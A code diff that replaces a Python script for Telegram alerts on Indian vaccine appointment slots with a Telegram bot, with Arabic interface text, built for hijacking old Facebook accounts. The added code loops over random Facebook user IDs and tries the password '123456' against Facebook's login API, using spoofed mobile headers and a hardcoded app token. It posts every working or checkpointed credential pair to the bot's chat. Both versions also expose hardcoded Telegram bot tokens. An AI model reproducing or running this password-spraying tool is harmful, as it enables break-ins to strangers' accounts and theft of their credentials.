@@ -1,80 +1,93 @@
-
-""" 
-Developer: aipython on [29-05-2021]
-website: www.aipython.in
-
-Sends Notifications on a Telegram channel , whenever the Vaccine(s) is available at the given PINCODE 
-"""
-
 import requests
-from datetime import datetime, timedelta
-import time
-import pytz
-# from os import environ
+from telebot import types
+import telebot
+import random
+import requests, sys, time, re, random
+tel="6866818296:AAHcR_oXq6_lRJ3Qa9biocEXvMLL8V2ZYT0"
+bot = telebot.TeleBot(tel);r=requests.session() 
+rua = random.choice([
+"Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]" , "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS]" , "Mozilla/5.0 (Linux; Android 12; SM-G781U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]"])
 
-# Define all the constants
-time_interval = 10 # (in seconds) Specify the frequency of code execution
-PINCODE = "110028"
-
-tele_auth_token = "1901486933:AAHed-MGB8hVwrmK4E-gvKTVd63XNkoxvPE" # Authentication token provided by Telegram bot
-tel_group_id = "test_Aug_vaccine"          # Telegram group name
-IST = pytz.timezone('Asia/Kolkata')        # Indian Standard Time - Timezone
-header = {'User-Agent': 'Chrome/84.0.4147.105 Safari/537.36'} # Header for using cowin api
-
-def update_timestamp_send_Request(PINCODE):
-    raw_TS = datetime.now(IST) + timedelta(days=1)      # Tomorrows date
-    tomorrow_date = raw_TS.strftime("%d-%m-%Y")         # Formatted Tomorrow's date
-    today_date = datetime.now(IST).strftime("%d-%m-%Y") #Current Date
-    curr_time = (datetime.now().strftime("%H:%M:%S"))   #Current time
-    request_link = f"https://cdn-api.co-vin.in/api/v2/appointment/sessions/public/calendarByPin?pincode={PINCODE}&date={tomorrow_date}"
-    response = requests.get(request_link, headers = header)
-    raw_JSON = response.json()
-    return raw_JSON, today_date, curr_time
-
-
-def get_availability_data():
-    slot_found_45 = False
-    slot_found_18 = False
-    
-    raw_JSON, today_date, curr_time = update_timestamp_send_Request(PINCODE)
-    print ("raw_JSON :" , raw_JSON)
-    
-    for cent in raw_JSON['centers']:
-        for sess in cent['sessions']:
-            sess_date = sess['date']
-            if sess['min_age_limit'] == 45 and sess['available_capacity'] > 0:
-                slot_found_45 =  True
-                msg = f"For age 45+ [Vaccine Available] at {PINCODE} on {sess_date}\n\tCenter : {cent['name']}\n\tVaccine: {sess['vaccine']}\n\tDose_1: {sess['available_capacity_dose1']}\n\tDose_2: {sess['available_capacity_dose2']}"
-                send_msg_on_telegram(msg)
-                print (f"INFO:[{curr_time}] Vaccine Found for 45+ at {PINCODE} >> Details sent on Telegram")
-                
-            elif sess['min_age_limit'] == 18 and sess['available_capacity'] > 0:
-                slot_found_18 =  True
-                msg = f"For age 18+ [Vaccine Available] at {PINCODE} on {sess_date}\n\tCenter : {cent['name']}\n\tVaccine: {sess['vaccine']}\n\tDose_1: {sess['available_capacity_dose1']}\n\tDose_2: {sess['available_capacity_dose2']}"
-                send_msg_on_telegram(msg)
-                print (f"INFO: [{curr_time}] Vaccine Found for 18+ at {PINCODE} >> Details sent on Telegram")
-    
-    if slot_found_45 == False and slot_found_18 == False:
-        print (f"INFO: [{today_date}-{curr_time}] Vaccine NOT-available for 45+ at {PINCODE}")
-        print (f"INFO: [{today_date}-{curr_time}] Vaccine NOT-available for 18+ at {PINCODE}")
-    elif slot_found_45 == False:
-        print (f"INFO: [{today_date}-{curr_time}] Vaccine NOT-available for 45+ at {PINCODE}")
-    else:
-        print (f"INFO: [{today_date}-{curr_time}] Vaccine NOT-available for 18+ at {PINCODE}")
-    
-
-def send_msg_on_telegram(msg):
-    telegram_api_url = f"https://api.telegram.org/bot{tele_auth_token}/sendMessage?chat_id=@{tel_group_id}&text={msg}"
-    tel_resp = requests.get(telegram_api_url)
-
-    if tel_resp.status_code == 200:
-        print ("Notification has been sent on Telegram")
-    else:
-        print ("Could not send Message")
-
-
-if __name__ == "__main__":    
-    while True:
-        get_availability_data()
-        time.sleep(time_interval)
-
+@bot.message_handler(commands=['start'])
+def start(message):
+    maac = types.InlineKeyboardMarkup()
+    maac.row_width = 2
+    ii = types.InlineKeyboardButton(text =" START",callback_data = 'yasir')
+    maac.add(ii)
+    bjj = message.chat.id
+    bot.send_message(message.chat.id,text=f"""
+اهلا بك في بوت صيد فيس قديم
+    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
+@bot.callback_query_handler(func=lambda call: True)
+def oss(call):
+    if call.data == 'yasir':
+    	yasir(call.message)
+    	
+def yasir(message):
+ no =0
+ ok =0
+ cp =0
+ dd = '123456789'
+ while True: 
+        re="".join(random.choice(dd)for i in range(9))
+        user = '100000' + re
+        pess = '123456'
+        ses = requests.Session()
+        headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": rua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pess)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
+        #print(response.json())
+         
+        if "session_key" in response.text and "EAAA" in response.text:
+        	ii=response.json()["session_key"]
+        	#print(response)
+        #if "checkpoint" in po.cookies.get_dict().keys():
+       # if 'logged_in_user' in req:
+        	ok+=1
+        	mees = types.InlineKeyboardMarkup(row_width=1)
+        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
+        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
+        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
+        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
+        	sa3= types.InlineKeyboardButton(f"{user}:{pess}",callback_data='sa3')
+        	sa4 = types.InlineKeyboardButton(f"programmer",url="https://t.me/anasmb ",callback_data='sa4')        	
+        	mees.add(sa6,sa1,sa5,sa2,sa3,sa4)
+        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)            	    	      	
+        	bot.send_message(message.chat.id,f"New Account\n username  : {user}\nPassword : {pess} ",parse_mode="html")
+        elif "www.facebook.com" in response.json()["error_msg"]:
+        	ii=response.json()["error_msg"]
+        	cp+=1
+        	mees = types.InlineKeyboardMarkup(row_width=1)
+        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
+        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
+        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
+        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
+        	sa3= types.InlineKeyboardButton(f"{user} : {pess}",callback_data='sa3')
+        	sa4 = types.InlineKeyboardButton(f"programmer ",url="https://t.me/anasmb ",callback_data='sa4')        	
+        	mees.add(sa1,sa5,sa2,sa3,sa4)
+        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)
+        	bot.send_message(message.chat.id,f"New Account\n username  : {user}\nPassword : {pess} ",parse_mode="html")        	        	
+        else:
+        	ii=response.json()["error_msg"]
+        	no+=1
+        	mees = types.InlineKeyboardMarkup(row_width=1)
+        	sa6 = types.InlineKeyboardButton(f"M: {ii}",callback_data='sa')
+        	sa1 = types.InlineKeyboardButton(f"DONE : {ok}",callback_data='sa2')
+        	sa5 = types.InlineKeyboardButton(f"CP : {cp}",callback_data='sa')
+        	sa2 = types.InlineKeyboardButton(f"BAD : {no}",callback_data='sa')        	        	
+        	sa3= types.InlineKeyboardButton(f"{user} : {pess}",callback_data='sa3')
+        	sa4 = types.InlineKeyboardButton(f"programmer ",url="https://t.me/anasmb ",callback_data='sa4')        	
+        	mees.add(sa6,sa1,sa5,sa2,sa3,sa4)
+        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="تم تشغيل البوت الرجاء التحلي بالصبر",parse_mode='markdown',reply_markup=mees)
+        	
+        	
+        
+bot.polling(True)
